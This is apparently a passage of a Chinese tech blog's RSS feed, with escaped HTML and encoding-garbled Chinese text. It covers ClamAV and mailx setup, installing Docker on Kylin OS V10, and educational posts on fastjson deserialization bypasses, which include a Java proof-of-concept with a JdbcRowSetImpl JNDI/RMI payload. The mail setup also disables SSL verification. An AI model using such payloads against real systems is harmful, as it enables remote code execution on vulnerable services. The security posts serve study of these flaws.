&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;freshclam
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯•&#34;&gt;è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯•&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clamscan -ri &amp;lt;/path1/to/scan&amp;gt; &amp;lt;/path2/to/scan&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¸¸ç”¨é…ç½®è¯´æ˜&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;--recursive[=yes/no(*)]     -r      é€’å½’æŸ¥æ‰¾
--infected                  -I      åªæ‰“å°å—å½±å“çš„æ–‡ä»¶ä¿¡æ¯
--remove[=yes/no(*)]                åˆ é™¤å—å½±å“çš„æ–‡ä»¶ã€‚(ä¸å»ºè®®ä½¿ç”¨,æ ¹æ®æ‰«æç»“æœè¿›è¡Œæ‰‹åŠ¨åˆ é™¤,é¿å…è¯¯åˆ ã€‚)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;é…ç½®é‚®ç®±&#34;&gt;é…ç½®é‚®ç®±&lt;/h3&gt;
&lt;p&gt;å¦‚æœä¸éœ€è¦é‚®ä»¶é€šçŸ¥çš„å¯ä»¥å¿½ç•¥æ­¤æ­¥éª¤ã€‚&lt;/p&gt;
&lt;h4 id=&#34;å®‰è£…é‚®ä»¶æœåŠ¡&#34;&gt;å®‰è£…é‚®ä»¶æœåŠ¡&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install -y mailx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¿®æ”¹é…ç½®&#34;&gt;ä¿®æ”¹é…ç½®&lt;/h4&gt;
&lt;p&gt;ä¿®æ”¹å¤§å†™å­—æ¯ä¸ºä½ çš„é‚®ç®±é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &amp;gt; /etc/mail.rc &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set from=USERNAME@YOURDOMAIN.COM
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set smtp=smtps://smtp.exmail.qq.com:465
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set smtp-auth=login
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set smtp-auth-user=USERNAME@YOURDOMAIN.COM
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set smtp-auth-password=YOURPASSWORD
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set ssl-verify=ignore
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set nss-config-dir=/etc/pki/nssdb/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯•&#34;&gt;å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯•&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your message&amp;#34;&lt;/span&gt; | mail -v -s &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message Subject&amp;#34;&lt;/span&gt; email@address
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœå‡ºç° â€œError in certificate: Peer&amp;rsquo;s certificate issuer is not recognizedâ€ å±äºæ­£å¸¸ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>åœ¨é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸Šå®‰è£…docker</title>
      <link>https://www.typesafe.cn/posts/install-docker-on-kylinos/</link>
      <pubDate>Tue, 21 Dec 2021 23:39:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/install-docker-on-kylinos/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ V10 æ˜¯é’ˆå¯¹ä¼ä¸šçº§å…³é”®ä¸šåŠ¡ï¼Œé€‚åº”è™šæ‹ŸåŒ–ã€ äº‘è®¡ç®—ã€å¤§æ•°æ®ã€å·¥ä¸šäº’è”ç½‘æ—¶ä»£å¯¹ä¸»æœºç³»ç»Ÿå¯é æ€§ã€å®‰å…¨æ€§ã€æ€§èƒ½ã€æ‰©å±•æ€§å’Œ å®æ—¶æ€§çš„éœ€æ±‚ï¼Œä¾æ® CMMI 5 çº§æ ‡å‡†ç ”åˆ¶çš„æä¾›å†…ç”Ÿå®‰å…¨ã€äº‘åŸç”Ÿæ”¯æŒã€å›½äº§ å¹³å°æ·±å…¥ä¼˜åŒ–ã€é«˜æ€§èƒ½ã€æ˜“ç®¡ç†çš„æ–°ä¸€ä»£è‡ªä¸»æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼›åŒæºæ”¯æŒé£è…¾ã€ é¾™èŠ¯ã€ç”³å¨ã€å…†èŠ¯ã€æµ·å…‰ã€é²²é¹ç­‰è‡ªä¸»å¹³å°ï¼›å¯æ”¯æ’‘æ„å»ºå¤§å‹æ•°æ®ä¸­å¿ƒæœåŠ¡å™¨é«˜ å¯ç”¨é›†ç¾¤ã€è´Ÿè½½å‡è¡¡é›†ç¾¤ã€åˆ†å¸ƒå¼é›†ç¾¤æ–‡ä»¶ç³»ç»Ÿã€è™šæ‹ŸåŒ–åº”ç”¨å’Œå®¹å™¨äº‘å¹³å°ç­‰ï¼Œ å¯éƒ¨ç½²åœ¨ç‰©ç†æœåŠ¡å™¨å’Œè™šæ‹ŸåŒ–ç¯å¢ƒã€ç§æœ‰äº‘ã€å…¬æœ‰äº‘å’Œæ··åˆäº‘ç¯å¢ƒï¼›åº”ç”¨äºæ”¿åºœã€ å›½é˜²ã€é‡‘èã€æ•™è‚²ã€è´¢ç¨ã€å…¬å®‰ã€å®¡è®¡ã€äº¤é€šã€åŒ»ç–—ã€åˆ¶é€ ç­‰é¢†åŸŸã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å…¬å¸æœ‰ä¸ªé¡¹ç›®éœ€è¦å°†ç³»ç»Ÿéƒ¨ç½²åœ¨ &lt;strong&gt;kylinos&lt;/strong&gt;ä¸Šï¼Œåˆšå¼€å§‹è¿˜æœ‰ç‚¹å¤´ç–¼ï¼Œå®³æ€•å„ç§ç¨‹åºæ— æ³•å®‰è£…å’Œä½¿ç”¨ï¼Œç­‰å®‰è£…å¥½æœåŠ¡å™¨è¿›è¡Œä½¿ç”¨çš„æ—¶å€™å‘ç°è¿™ä¸å°±æ˜¯åŸºäºcentosçš„å˜›ï¼Œè™½ç„¶åŸºäºå“ªä¸ªç‰ˆæœ¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•çš„ï¼Œäºæ˜¯æˆ‘ä¸€é¡¿æ“ä½œï¼Œæœ€åå‘ç°å®ƒæ˜¯åŸºäºCentos8çš„ï¼Œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬æ˜¯ 4.19ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ—¢ç„¶æ˜¯åŸºäºCentos8çš„ï¼Œé‚£Centos8ä¸Šèƒ½è·‘çš„ç¨‹åºï¼Œåœ¨è¿™è‚¯å®šä¹Ÿèƒ½è·‘ï¼Œç„¶åæˆ‘å°±å¼€å§‹äº†æ„‰å¿«ï¼ˆç—›è‹¦ï¼‰çš„å®‰è£…dockerä¹‹æ—…äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;é…ç½®é˜¿é‡Œäº‘centos8é•œåƒæº&#34;&gt;é…ç½®é˜¿é‡Œäº‘Centos8é•œåƒæº&lt;/h3&gt;
&lt;p&gt;ä¹‹æ‰€ä»¥è¦é…ç½® Centos8 çš„é•œåƒæºæ˜¯å› ä¸ºåœ¨å®‰è£…dockerçš„æ—¶å€™éœ€è¦é¢å¤–çš„ä¸€äº›ä¾èµ–ï¼Œè€Œè¿™äº›ä¾èµ–åœ¨éº’éºŸå®˜æ–¹çš„æºé‡Œé¢æ˜¯æ²¡æœ‰çš„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;é…ç½®é˜¿é‡Œäº‘-docker-é•œåƒæº&#34;&gt;é…ç½®é˜¿é‡Œäº‘ docker é•œåƒæº&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+&amp;#39;&lt;/span&gt; /etc/yum.repos.d/docker-ce.repo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å®šä¹‰-yum-å˜é‡ä¿®æ”¹-repo&#34;&gt;å®šä¹‰ yum å˜é‡&amp;amp;ä¿®æ”¹ repo&lt;/h3&gt;
&lt;p&gt;ä¿®æ”¹ centos å’Œ docker &lt;code&gt;repo&lt;/code&gt;æ–‡ä»¶ä¸­çš„ &lt;code&gt;$releasever&lt;/code&gt; ä¸º &lt;code&gt;centos_version&lt;/code&gt; ï¼ŒåŸå› æ˜¯åœ¨éº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸­ &lt;code&gt;$releasever&lt;/code&gt;è¢«ä¿®æ”¹ä¸ºäº† 10ï¼Œè€Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ centos 8çš„é•œåƒæºï¼Œå¦‚æœä½ ä¸æ›¿æ¢ï¼ŒåŸºæœ¬ä¸Šä»“åº“çš„æ¯ä¸€ä¸ªåœ°å€éƒ½æ˜¯404ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8&amp;#34;&lt;/span&gt; &amp;gt; /etc/yum/vars/centos_version
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span&gt; /etc/yum.repos.d/docker-ce.repo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span&gt; /etc/yum.repos.d/CentOS-Base.repo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å»ºç«‹yumç¼“å­˜&#34;&gt;å»ºç«‹yumç¼“å­˜&lt;/h3&gt;
&lt;p&gt;æ²¡å•¥å¯è¯´çš„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum makecache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;æŸ¥çœ‹docker-ce-ç‰ˆæœ¬&#34;&gt;æŸ¥çœ‹docker-ce ç‰ˆæœ¬&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum list docker-ce --showduplicates | sort -r
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.9-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.8-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.7-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.6-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.5-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.4-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.3-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.2-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.1-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.12-3.el8                docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.11-3.el8                docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.10-3.el8                docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:20.10.0-3.el8                 docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:19.03.15-3.el8                docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:19.03.15-3.el8                @docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:19.03.14-3.el8                docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-ce.x86_64               3:19.03.13-3.el8                docker-ce-stable
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å®‰è£…docker&#34;&gt;å®‰è£…docker&lt;/h3&gt;
&lt;p&gt;è¿™é‡Œè¦å®‰è£… docker-ce 19.03 ç‰ˆæœ¬ï¼Œå› ä¸ºæˆ‘åœ¨ä½¿ç”¨æœ€æ–°ç‰ˆ 20.10 å¯åŠ¨å®¹å™¨æ—¶å‡ºç°äº†æœªçŸ¥çš„æƒé™é—®é¢˜ï¼Œè€Œéº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»Ÿèµ„æ–™ç›¸å¯¹è¾ƒå°‘ï¼Œæˆ‘æœªèƒ½æ‰¾åˆ°ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼Œåªå¥½é€€è€Œæ±‚å…¶æ¬¡ï¼Œæ¢åˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå…­ï¼‰fastjson 1.2.68 ç»•è¿‡åŸç†</title>
      <link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link>
      <pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid>
      <description>&lt;h2 id=&#34;å£°æ˜&#34;&gt;å£°æ˜&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p&gt;
&lt;h2 id=&#34;fastjson--1268-expectclass-ç»•è¿‡åŸç†&#34;&gt;Fastjson &amp;lt;= 1.2.68 expectClass ç»•è¿‡åŸç†&lt;/h2&gt;
&lt;p&gt;å½“ fastjson æ›´æ–°åˆ° 1.2.68 ä¹‹åï¼Œå¤§éƒ¨åˆ†å®‰å…¨æ¼æ´éƒ½å·²ç»å°å µä½äº†ï¼Œä½†ä¸æ’é™¤è¿˜æœ‰äººæ‰‹é‡Œæ¡ç€ä¸€äº› 0day æ²¡æœ‰æ”¾å‡ºæ¥ã€‚&lt;/p&gt;
&lt;p&gt;fastjson 1.2.68 åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ &lt;code&gt;ObjectDeserializer&lt;/code&gt; çš„ &lt;code&gt;deserialze&lt;/code&gt; æ–¹æ³•ï¼Œè€Œ å®‰å…¨äººå‘˜å‘ç° å½“ &lt;code&gt;@type&lt;/code&gt; ä¸º &lt;code&gt;java.lang.AutoCloseable&lt;/code&gt; çš„æ—¶å€™ä¼šæ‰¾åˆ°å®ç°ç±» &lt;code&gt;JavaBeanDeserializer&lt;/code&gt; è°ƒç”¨ &lt;code&gt;deserialze&lt;/code&gt;ï¼Œè€Œ &lt;code&gt;JavaBeanDeserializer&lt;/code&gt; çš„ &lt;code&gt;deserialze&lt;/code&gt; æ–¹æ³•è¿˜ä¼šç»§ç»­è§£æå¾—åˆ°ç¬¬äºŒä¸ª &lt;code&gt;@type&lt;/code&gt; å¯¹åº”çš„å€¼è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸” &lt;code&gt;expectClass&lt;/code&gt; åˆ™ä¸å†æ˜¯ &lt;code&gt;null&lt;/code&gt; å€¼ï¼Œè€Œæ˜¯ &lt;code&gt;java.lang.AutoCloseable&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;JavaBeanDeserializer&lt;/code&gt; çš„ &lt;code&gt;deserialze&lt;/code&gt; éƒ¨åˆ†ä»£ç ç¤ºä¾‹ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (lexer.token() == JSONToken.LITERAL_STRING) {
    // ç¬¬äºŒä¸ª @type çš„å€¼
    String typeName = lexer.stringVal();
    lexer.nextToken(JSONToken.COMMA);

    if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
        if (lexer.token() == JSONToken.RBRACE) {
            lexer.nextToken();
            break;
        }
        continue;
    }
    
    // è¿™é‡Œæ²¡æœ‰è·å–åˆ° deserializer
    ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
    Class&amp;lt;?&amp;gt; userType = null;

    if (deserializer == null) {
        // ç¬¬ä¸€ä¸ª @type çš„å€¼ 
        Class&amp;lt;?&amp;gt; expectClass = TypeUtils.getClass(type);
        // åœ¨åŒ…å« expectClass æ—¶ä¼šç»•è¿‡
        userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
        deserializer = parser.getConfig().getDeserializer(userType);
    }
    
    // å†æ¬¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šè§¦å‘åå°„æ„é€ å®ä¾‹
    Object typedObject = deserializer.deserialze(parser, userType, fieldName);
    if (deserializer instanceof JavaBeanDeserializer) {
        JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
        if (typeKey != null) {
            FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
            if (typeKeyFieldDeser != null) {
                typeKeyFieldDeser.setValue(typedObject, typeName);
            }
        }
    }
    return (T) typedObject;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;ParseConfig&lt;/code&gt; çš„ &lt;code&gt;checkAutoType&lt;/code&gt; éƒ¨åˆ†ä»£ç ç¤ºä¾‹ï¼Œåªè¦ç¬¬äºŒä¸ª &lt;code&gt;@type&lt;/code&gt; ç»§æ‰¿äº† ç¬¬ä¸€ä¸ª &lt;code&gt;@type&lt;/code&gt; å³å¯è§¦å‘ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäº”ï¼‰fastjson 1.2.47 ç»•è¿‡åŸç†</title>
      <link>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</link>
      <pubDate>Sun, 31 Oct 2021 21:31:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</guid>
      <description>&lt;h2 id=&#34;å£°æ˜&#34;&gt;å£°æ˜&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p&gt;
&lt;h2 id=&#34;fastjson--1247-poc&#34;&gt;Fastjson &amp;lt;= 1.2.47 POC&lt;/h2&gt;
&lt;p&gt;éšç€ fastjson çš„æ›´æ–°ï¼Œä»¥å¾€çš„å®‰å…¨æ¼æ´éƒ½è¢«å°å µæ‰äº†ï¼Œä½†é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå®‰å…¨äººå‘˜å‘ç°äº†ä¸€ä¸ªé€šæ€çš„æ¼æ´ï¼Œä»¥å¾€çš„å°å µæ‰‹æ®µéƒ½å¯ä»¥ç»•è¿‡ï¼Œç®—æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘çš„å‘ç°ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆå°† fastjson å‡çº§åˆ° 1.2.47 ç‰ˆæœ¬ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬ä¹‹å‰çš„POCè¿›è¡Œæµ‹è¯•ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; com.alibaba.fastjson.JSON;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Eval3&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        String payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        JSON.&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(payload);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
